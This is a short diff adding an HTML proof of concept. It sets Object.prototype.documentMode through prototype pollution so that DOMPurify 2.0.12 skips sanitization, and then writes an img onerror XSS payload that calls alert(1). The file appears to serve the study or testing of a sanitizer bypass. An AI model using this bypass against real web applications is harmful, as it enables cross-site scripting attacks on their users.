@@ -1,0 +1,7 @@
+<script>
+  Object.prototype.documentMode = 9
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.0.12/purify.min.js"></script>
+<script>
+  document.write(DOMPurify.sanitize('<img src onerror=alert(1)>'))
+</script>
